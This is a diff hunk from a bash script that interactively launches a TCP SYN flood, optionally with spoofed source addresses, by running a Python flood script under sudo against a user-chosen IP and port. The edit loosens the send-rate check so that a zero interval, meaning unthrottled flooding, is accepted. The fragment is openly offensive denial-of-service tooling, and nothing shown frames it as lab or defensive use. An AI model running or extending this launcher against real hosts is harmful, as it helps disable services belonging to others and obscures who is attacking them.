@@ -70,8 +70,8 @@ if ask_yes_no "Do you want to launch the TCP SYN Flood Attack?"; then
                 SPOOF_OPTION="--no_spoof"
             fi
             read -p "Enter send rate (interval in seconds, e.g., 0.01 for 100pps): " SYN_SEND_RATE
-            if ! [[ "$SYN_SEND_RATE" =~ ^[0-9]*\.?[0-9]+$ ]] || (( $(echo "$SYN_SEND_RATE <= 0" | bc -l) )); then
-                echo "Invalid send rate. Using default 0.01. Skipping SYN Flood Attack."
+            if ! [[ "$SYN_SEND_RATE" =~ ^[0-9]*\.?[0-9]+$ ]] || (( $(echo "$SYN_SEND_RATE < 0" | bc -l) )); then
+                echo "Invalid send rate. Skipping SYN Flood Attack."
             else
                 echo "[+] Launching TCP SYN Flood on $TARGET_IP:$SYN_TARGET_PORT..."
                 sudo python3 "$SYN_FLOOD_SCRIPT" "$TARGET_IP" "$SYN_TARGET_PORT" "$SYN_NUM_PACKETS" $SPOOF_OPTION --rate "$SYN_SEND_RATE"
